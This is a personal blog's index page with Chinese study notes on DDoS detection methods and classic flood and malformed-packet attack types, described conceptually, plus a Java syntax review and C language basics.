<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"h01iday.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://h01iday.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="H01iday">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://h01iday.github.io/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hexo</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Hexo</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-overview">
            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">H01iday</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">32</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



          </div>
        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/11/26/DDoS%E6%A3%80%E6%B5%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/26/DDoS%E6%A3%80%E6%B5%8B/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-11-26 20:01:26" itemprop="dateCreated datePublished" datetime="2021-11-26T20:01:26+08:00">2021-11-26</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-11-11 21:49:39" itemprop="dateModified" datetime="2021-11-11T21:49:39+08:00">2021-11-11</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="DDOS检测方法"><a href="#DDOS检测方法" class="headerlink" title="DDOS检测方法"></a>DDOS检测方法</h2><ol>
<li>分析流量模型</li>
<li>数据包特征</li>
</ol>
<p>队列模型方法、客户响应分析法、单链路的流量信号分析方法</p>
<p>队列模型方法：把服务端的等待队列长度作为检测依据。正常情况下服务器端的等待服务队列比较小,因此用户的请求都能得到及时响应;相反,当受到攻击时等待队列会迅速增大。因此可以对该对列设置一个门限,通过分析等待队列的大小来检测攻击。</p>
<p>客户响应分析法：客户响应分析法利用某些通信协议的拥塞控制机制来检测攻击,如TCP协议。服务器在忙时如果收到服务请求,将对该请求延迟响应,正常用户会据此判定网络出现拥塞,通过减小发送窗口大小从而降低请求速率。攻击者作为一个非正常用户,使用虚假P发送数据包,不会收到响应数据包,也就不会降低发送请求速率,因此通过用户的响应特征可以检测出攻击。</p>
<p>单链路的流量信号分析方法：单条链路的流量信号分析方法是将一条链路的流量信号看作一个一维信号,采用一维信号分析方法进行异常检测（也有个别方法将一维信号分解成二维信号进行分析 )。</p>
<h2 id="DDoS攻击"><a href="#DDoS攻击" class="headerlink" title="DDoS攻击"></a>DDoS攻击</h2><h3 id="泛洪攻击"><a href="#泛洪攻击" class="headerlink" title="泛洪攻击"></a>泛洪攻击</h3><p>泛洪攻击（Flood攻击):攻击者利用僵尸机或者自身向被攻击者短时间内大量发送经过伪造的请求服务报文来消耗被攻击者的资源。</p>
<p>SYN Flood：</p>
<p>三次握手</p>
<img src="D:\blog\H01iday\source\_posts\pics\三.png" alt="三" style="zoom:67%;" />

<p>client给server发送syn①</p>
<p>server给client回syn ack② 在缓冲区存储握手信息，等待client进行③</p>
<p>如果client一直不进行③，server的资源被大量占用</p>
<p>UDP Flood：传输层</p>
<p>UDP不需要建立连接，可以直接发数据。</p>
<p>攻击者向server发送大量数据包。</p>
<p>若目的端口不存在可连接的应用程序，server需回复ICMP数据包。</p>
<p>查找和回复需要占据server大量资源。</p>
<p>SYN-ACK Flood：</p>
<p>client/attacker向server发送SYN-ACK报文。</p>
<p>attacker会检查是否在正常三次握手范围内。</p>
<p>如果不在，返回RST报文告诉attacker报文发送有误。</p>
<p>如果attacker向server发送大量的SYN-ACK报文，那么server需要耗费资源时间回复RST报文。导致资源耗尽。</p>
<h3 id="畸形或特殊控制报文攻击"><a href="#畸形或特殊控制报文攻击" class="headerlink" title="畸形或特殊控制报文攻击"></a>畸形或特殊控制报文攻击</h3><p>Smurf： </p>
<p>attacker以victim为源ip，向网络中发出ping的广播报文。icmpEchoRequest</p>
<p>网络中的接收到该ping报文的主机，都向victim的ip地址发送icmpEchoReply。</p>
<p>大量主机向victim发送icmp报文，导致victim资源被消耗光</p>
<p>Land：</p>
<p>attacker向victim发送SYN数据包(三次握手中的第一次)，其中源&amp;目的ip都为victim的ip地址。</p>
<p>victim会持续地自我应答，且会为连接分配内存到连接超时。自我消耗资源。</p>
<p>Fraggle：</p>
<p>和Smurf类似</p>
<p>运行Chargen服务的UDP端口（通常为19），收到一个数据包，产生一个字符串作为回应。</p>
<p>运行Echo服务的UDP端口（通常为7），收到一个数据包，会返回该包的数据内容作为回应。</p>
<p>attacker向网络发送UDP报文。源ip为victim的ip，目的ip为广播。目的端口为7/19</p>
<p>网络中的其它主机收到报文，大量主机向victim发送回应报文，使得victim崩溃。</p>
<p>到这里，和Smurf类似。只不过是由icmp报文变为了UDP报文。</p>
<p>如果源ip地址改为7，目的端口为19 （其它搭配也可7/19），那么就会无限循环，产生巨大危害。</p>
<p>Teardrop：</p>
<p>大的IP数据包，在链路层进行传输时，链路层有MTU（Maximum Transmission Unit）的要求。</p>
<p>超出MTU就要分片传输。故每个IP报头有偏移字段。</p>
<p>攻击者拦截其中的IP数据包，并修改偏移字段为不正确的值。</p>
<p>当victim接收者接收到数据包，接收端会不断地根据偏移字段将分片的IP数据包拼接起来。</p>
<p>以至操作系统因资源耗尽而崩溃。</p>
<h3 id="扫描探测攻击"><a href="#扫描探测攻击" class="headerlink" title="扫描探测攻击"></a>扫描探测攻击</h3><p>网络探测行为，不具有破坏性。</p>
<h2 id="DDoS攻击检测技术"><a href="#DDoS攻击检测技术" class="headerlink" title="DDoS攻击检测技术"></a>DDoS攻击检测技术</h2><h3 id="基于传统统计学的方法"><a href="#基于传统统计学的方法" class="headerlink" title="基于传统统计学的方法"></a>基于传统统计学的方法</h3><h3 id="基于机器学习的方法"><a href="#基于机器学习的方法" class="headerlink" title="基于机器学习的方法"></a>基于机器学习的方法</h3><h3 id="基于深度学习的方法"><a href="#基于深度学习的方法" class="headerlink" title="基于深度学习的方法"></a>基于深度学习的方法</h3>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/11/26/java%E5%BF%AB%E9%80%9F%E5%A4%8D%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/26/java%E5%BF%AB%E9%80%9F%E5%A4%8D%E4%B9%A0/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-11-26 20:01:12" itemprop="dateCreated datePublished" datetime="2021-11-26T20:01:12+08:00">2021-11-26</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-11-18 20:15:35" itemprop="dateModified" datetime="2021-11-18T20:15:35+08:00">2021-11-18</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// single-line comments start with &#x27;//&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	multi-line comments look like this </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<h3 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Import ArrayList class inside of the java.util package</span></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="comment">// Import all classes inside of java.security package</span></span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br></pre></td></tr></table></figure>



<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// System.out.println() 输出后自带回车换行</span></span><br><span class="line">System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">System.out.println(</span><br><span class="line">    <span class="string">&quot;Integer: &quot;</span> + <span class="number">10</span> +</span><br><span class="line">    <span class="string">&quot; Double: &quot;</span> + <span class="number">3.14</span> +</span><br><span class="line">    <span class="string">&quot; Boolean: &quot;</span> + <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">/*  output:</span></span><br><span class="line"><span class="comment">	Hello World!</span></span><br><span class="line"><span class="comment">	Integer: 10 Double: 3.14 Boolean: true</span></span><br><span class="line"><span class="comment">*/</span>		  </span><br><span class="line"></span><br><span class="line"><span class="comment">// System.out.print() 输出后不会自动换行</span></span><br><span class="line">System.out.print(<span class="string">&quot;Hello &quot;</span>);</span><br><span class="line">System.out.print(<span class="string">&quot;World&quot;</span>);</span><br><span class="line"><span class="comment">/*  output:</span></span><br><span class="line"><span class="comment">	Hello World!</span></span><br><span class="line"><span class="comment">*/</span>		</span><br><span class="line"></span><br><span class="line"><span class="comment">// Use System.out.printf() 格式化输出</span></span><br><span class="line">System.out.printf(<span class="string">&quot;pi = %.5f&quot;</span>, Math.PI); <span class="comment">// =&gt; pi = 3.14159</span></span><br></pre></td></tr></table></figure>



<h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// must import java.util.Scanner;</span></span><br><span class="line"></span><br><span class="line">Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"></span><br><span class="line"><span class="comment">// read string input</span></span><br><span class="line">String name = scanner.next();</span><br><span class="line"></span><br><span class="line"><span class="comment">// read byte input</span></span><br><span class="line"><span class="keyword">byte</span> numByte = scanner.nextByte();</span><br><span class="line"></span><br><span class="line"><span class="comment">// read int input</span></span><br><span class="line"><span class="keyword">int</span> numInt = scanner.nextInt();</span><br><span class="line"></span><br><span class="line"><span class="comment">// read long input</span></span><br><span class="line"><span class="keyword">float</span> numFloat = scanner.nextFloat();</span><br><span class="line"></span><br><span class="line"><span class="comment">// read double input</span></span><br><span class="line"><span class="keyword">double</span> numDouble = scanner.nextDouble();</span><br><span class="line"></span><br><span class="line"><span class="comment">// read boolean input</span></span><br><span class="line"><span class="keyword">boolean</span> bool = scanner.nextBoolean();</span><br></pre></td></tr></table></figure>



<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明变量</span></span><br><span class="line"><span class="keyword">int</span> <span class="keyword">var</span>;</span><br><span class="line"><span class="keyword">int</span> var1, var2;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化变量</span></span><br><span class="line"><span class="keyword">int</span> <span class="keyword">var</span> = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>



<p>类型：</p>
<p>byte、int、short、long、float、double、boolean、char、String[注意S大写]、final[定义常量]</p>
<h3 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h3><p>单引号 ==》 char 只能引一个字符</p>
<p>双引号==》 string可以引0个及以上字符</p>
<h3 id="String-Building"><a href="#String-Building" class="headerlink" title="String Building"></a>String Building</h3><h4 id="1-用’-’将字符串连接起来"><a href="#1-用’-’将字符串连接起来" class="headerlink" title="#1 用’+’将字符串连接起来"></a>#1 用’+’将字符串连接起来</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String str = <span class="string">&quot;Hello &quot;</span>+<span class="string">&quot;World&quot;</span>;</span><br><span class="line">System.out.println(str);<span class="comment">//output: Hello World</span></span><br></pre></td></tr></table></figure>



<h4 id="2-使用StringBuilder"><a href="#2-使用StringBuilder" class="headerlink" title="#2 使用StringBuilder"></a>#2 使用StringBuilder</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder foo = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">foo.append(<span class="string">&quot;you &quot;</span>);</span><br><span class="line">foo.append(<span class="string">&quot;are &quot;</span>);</span><br><span class="line">foo.append(<span class="string">&quot;pretty&quot;</span>);</span><br><span class="line">System.out.println(foo.toString());<span class="comment">//output:you are pretty</span></span><br></pre></td></tr></table></figure>



<h4 id="3-使用String-format"><a href="#3-使用String-format" class="headerlink" title="#3 使用String.format"></a>#3 使用String.format</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String foo = String.format(<span class="string">&quot;%s may prefer %s.&quot;</span>, <span class="string">&quot;Or you&quot;</span>, <span class="string">&quot;pizzas&quot;</span>);</span><br><span class="line">System.out.println(foo);<span class="comment">//output: Or you may prefer pizzas </span></span><br></pre></td></tr></table></figure>



<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">声明数组：</span><br><span class="line">①&lt;datatype&gt;[] arrayName = <span class="keyword">new</span> &lt;datatype&gt;[&lt;array size&gt;];</span><br><span class="line">②&lt;datatype&gt; arrayName[] = <span class="keyword">new</span> &lt;datatype&gt;[&lt;array size&gt;];</span><br><span class="line"><span class="keyword">int</span>[] intArray = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">③声明&amp;初始化数组：</span><br><span class="line"><span class="keyword">int</span>[] y = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>&#125;;</span><br><span class="line">String names[] = &#123;<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Mary&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="for-each-loop"><a href="#for-each-loop" class="headerlink" title="for each loop"></a>for each loop</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] fooList = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> bar : fooList) &#123;</span><br><span class="line">    System.out.println(bar);</span><br><span class="line">    <span class="comment">//Iterates 9 times and prints 1-9 on new lines</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="try-catch-finally"><a href="#try-catch-finally" class="headerlink" title="try-catch-finally"></a>try-catch-finally</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="keyword">int</span>[] myNumbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">	System.out.println(myNumbers[<span class="number">10</span>]);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;Something went wrong.&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;<span class="comment">//finally是在try-catch执行结束之后，regardless of the result,一定会执行的code，可选</span></span><br><span class="line">	System.out.println(<span class="string">&quot;The &#x27;try catch&#x27; is finished.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id=""><a href="#" class="headerlink" title="? :"></a>? :</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;statement&gt; ? &lt;first value&gt; : &lt;second value&gt;</span><br><span class="line"><span class="comment">//Reads as &quot;If (statement) is true, use &lt;first value&gt;, otherwise, use &lt;second value&gt;&quot;    </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> foo = <span class="number">5</span>;</span><br><span class="line">String bar = (foo &lt; <span class="number">10</span>) ? <span class="string">&quot;A&quot;</span> : <span class="string">&quot;B&quot;</span>;a</span><br><span class="line">System.out.println(<span class="string">&quot;bar : &quot;</span> + bar);<span class="comment">//output：A</span></span><br></pre></td></tr></table></figure>



<h4 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h4><p>String ==&gt; Integer</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Integer.parseInt(<span class="string">&quot;123&quot;</span>);</span><br></pre></td></tr></table></figure>

<p> Integer  ==&gt; String</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Integer.toString(<span class="number">123</span>);</span><br></pre></td></tr></table></figure>



<h3 id="class"><a href="#class" class="headerlink" title="class"></a>class</h3>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/11/06/C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/06/C/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-11-06 20:53:18" itemprop="dateCreated datePublished" datetime="2021-11-06T20:53:18+08:00">2021-11-06</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-11-08 20:45:47" itemprop="dateModified" datetime="2021-11-08T20:45:47+08:00">2021-11-08</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="Variable"><a href="#Variable" class="headerlink" title="Variable"></a>Variable</h2><h3 id="Name"><a href="#Name" class="headerlink" title="Name"></a>Name</h3><ol>
<li><p>组成：</p>
<p>字母、数字、下划线</p>
</li>
<li><p>格式：</p>
<p>不能以数字开头。</p>
<p>最好以字母开头。</p>
<p>区分大小写。</p>
</li>
</ol>
<h3 id="Type-amp-Size"><a href="#Type-amp-Size" class="headerlink" title="Type &amp; Size"></a>Type &amp; Size</h3><p>char</p>
<p>int </p>
<p>【short int sh;  ===》  short sh; 】</p>
<p>【long int lo;  ===》  long lo;】</p>
<p>float</p>
<p>double</p>
<p><strong>关于char:</strong></p>
<p>char分配1字节，存储ASCII码</p>
<p><strong>关于double 和 float:</strong></p>
<p>float单精度，占4字节；</p>
<p>double双精度，占8字节；</p>
<p><strong>关于short 和 long：</strong></p>
<p>short 至少占用 2 个字节。</p>
<p>int 为一个机器字长。32 位环境下机器字长为 4 字节，64 位环境下机器字长为 8 字节。</p>
<p>short 的长度不能大于 int，long 的长度不能小于 int。</p>
<p>==2 ≤ short ≤ int ≤ long==</p>
<p>这里的short和long都没有一个准确的规定，为一个宽泛的限制。在不同的系统里面short、int、long的值可能不一样。</p>
<p><strong>关于signed  和  unsigned：</strong></p>
<p>signed 有符号</p>
<p>unsigned 无符号</p>
<p> if chars are 8 bits, unsigned char variables have values  between 0 and 255, while signed chars have values between -128 and 127 </p>
<h5 id="关于强制类型转换"><a href="#关于强制类型转换" class="headerlink" title="关于强制类型转换"></a>关于强制类型转换</h5><p>隐式类型转换：如+/*等运算符有两个类型不同的运算数，那么在执行时会自动进行类型转换。</p>
<p>这种转换一般是由低精度向高精度转化，以免丢失精度。</p>
<p>If there are no unsigned operands, however, the following informal set of rules will suffice:</p>
<p>  • If either operand is long double, convert the other to long double.  </p>
<p>  • Otherwise, if either operand is double, convert the other to double.  </p>
<p>  • Otherwise, if either operand is float, convert the other to float. </p>
<p>  • Otherwise, convert char and short to int.  </p>
<p>  • Then, if either operand is long, convert the other to long.</p>
<h3 id="Constants"><a href="#Constants" class="headerlink" title="Constants"></a>Constants</h3><h5 id="常量类型表示："><a href="#常量类型表示：" class="headerlink" title="常量类型表示："></a>常量类型表示：</h5><p>integer constant：1234</p>
<p>long constant：123456789l/L【l/L结尾】</p>
<p>unsigned constant：123u/U【u/U结尾】</p>
<p>浮点数常量默认为double类型：123.4  1e-2(科学计数法，1.0*10的-2次方)</p>
<p>float constant：123.4f/F【f/F结尾】</p>
<p>character constant：以integer存储。整数值为该字符在机器字符集中的数值 </p>
<p> enumeration constant：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">boolean</span> &#123;</span> NO, YES &#125;;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">escapes</span> &#123;</span> BELL = <span class="string">&#x27;\a&#x27;</span>, BACKSPACE = <span class="string">&#x27;\b&#x27;</span>, TAB = <span class="string">&#x27;\t&#x27;</span>, NEWLINE = <span class="string">&#x27;\n&#x27;</span>, VTAB = <span class="string">&#x27;\v&#x27;</span>, RETURN = <span class="string">&#x27;\r&#x27;</span> &#125;; </span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">months</span> &#123;</span> JAN = <span class="number">1</span>, FEB, MAR, APR, MAY, JUN,  JUL, AUG, SEP, OCT, NOV, DEC &#125;;</span><br></pre></td></tr></table></figure>

<p>如例1，如果没有规定值。默认为从0开始的int，即NO：0；YES：1；</p>
<p>例2，所有都规定了值。</p>
<p>例3，如果只有部分规定值，则后面的值为前面的值的延续。FEB：2；MAR：3；</p>
<h5 id="进制："><a href="#进制：" class="headerlink" title="进制："></a>进制：</h5><p>31的三种进制表示</p>
<p>decimal十：31</p>
<p>octal八：037【0开头】</p>
<p>hexadecimal十六：0x1F【0x开头】</p>
<h5 id="转义字符常量："><a href="#转义字符常量：" class="headerlink" title="转义字符常量："></a>转义字符常量：</h5><table>
<thead>
<tr>
<th>转义字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>\a</td>
<td>bell character让电脑的警示提示音响起来</td>
</tr>
<tr>
<td>\b</td>
<td>backspace 删除前一个字符</td>
</tr>
<tr>
<td>\n</td>
<td>new line换行</td>
</tr>
<tr>
<td>\r</td>
